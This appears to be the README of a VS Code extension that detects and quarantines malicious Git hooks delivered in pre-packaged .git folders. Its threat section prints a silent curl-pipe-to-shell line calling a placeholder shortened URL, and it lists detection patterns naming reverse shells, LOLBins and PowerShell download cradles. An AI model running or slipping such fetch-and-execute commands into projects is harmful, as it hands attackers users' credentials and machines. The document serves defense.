# Git Hook Guard

**Stop malicious Git hooks before they ever run.** Git Hook Guard automatically scans every repository you open in VS Code, warns you the moment it finds a hook that could execute hidden code, and lets you neutralize it in one click.

---

## The threat this saves you from

`git clone` does **not** copy hooks — so a normal clone is safe. But attackers get around that by shipping a project as a **folder or ZIP that already contains its `.git` directory**. Hidden inside `.git/hooks/` are scripts that Git runs **automatically** on ordinary actions: `commit`, `checkout`, `merge`, `pull`, `push`, even background garbage-collection.

A single line like this is all it takes:

```sh
curl -sL https://bit.ly/xxxxxx | sh > /dev/null 2>&1 &
```

That downloads a payload from the internet and runs it **silently, in the background**, with your user's privileges. It's the exact technique used by the widely-reported **"Contagious Interview"** scam, where fake recruiters send a "coding assessment" that quietly steals browser passwords, session cookies, crypto wallets, SSH keys, and cloud tokens the first time you run *any* git command.

**Merely opening or extracting the files is harmless — the trap springs on your first git operation.** Git Hook Guard catches it in that window.

## What it does

- 🔍 **Auto-scans on open.** Every time you open a folder/window, it inspects each repo's `.git/hooks` (and any `core.hooksPath` override) — no action needed from you.
- 🚨 **Warns clearly.** If a hook matches known attack patterns, you get a blocking popup that names the file and explains *why* it's dangerous.
- 🛡️ **One-click quarantine.** Neutralizes the hooks by renaming them to `*.quarantined`, so Git can never execute them — while keeping a copy for inspection.
- 🧰 **On-demand commands** for scanning or quarantining any time.
- 🔒 **100% local.** No telemetry, no network calls, no data leaves your machine. It only reads hook files and, if you approve, renames them.

## How it protects you, step by step

1. You receive or clone a repo and open it in VS Code.
2. Git Hook Guard scans `.git/hooks` before you run anything.
3. If it finds a `curl | sh`, a shortened URL, a hidden background command, etc., it stops you with a warning.
4. You click **Quarantine hooks** — the malicious scripts are disarmed.
5. You keep working safely. The attack never gets its first git-operation trigger.

## What it flags

Shortened URLs (`bit.ly`, `tinyurl`, …), `curl`/`wget` piped into a shell, pipe-to-shell of any kind, hidden background execution (`>/dev/null 2>&1 &`), base64-encoded payloads, Windows living-off-the-land tools (`certutil`, `bitsadmin`, `mshta`, `rundll32`, `regsvr32`), PowerShell `IEX`/`IWR`/`DownloadString`, encoded PowerShell commands, reverse shells (`nc -e`, `/dev/tcp/`), and any `core.hooksPath` override pointing at an in-repo directory.

## Commands

Open the Command Palette (`Ctrl/Cmd+Shift+P`):

- **Git Hook Guard: Scan Workspace for Malicious Hooks**
- **Git Hook Guard: Quarantine Active Hooks in Workspace**

## Settings

| Setting | Default | Description |
| --- | --- | --- |
| `gitHookGuard.scanOnOpen` | `true` | Automatically scan when a folder/window opens. |
| `gitHookGuard.flagAllActiveHooks` | `false` | Warn about *any* active (non-`.sample`) hook, not just dangerous-looking ones. |

## Recommended companion hardening

For protection that also covers **terminal** clones/extracts (outside VS Code), point Git at an empty global hooks directory so repo-delivered hooks can't run anywhere:

```sh
mkdir ~/.githooks-disabled
git config --global core.hooksPath ~/.githooks-disabled
```

Tools like Husky still work (they set `core.hooksPath` per-repo, which overrides the global). To let a specific trusted repo use its own hooks:

```sh
git -C <repo> config core.hooksPath .git/hooks
```

## Un-quarantine

If you've reviewed a hook and trust it, rename it back (e.g. `pre-commit.quarantined` → `pre-commit`).

## License

MIT. Contributions and issue reports welcome.
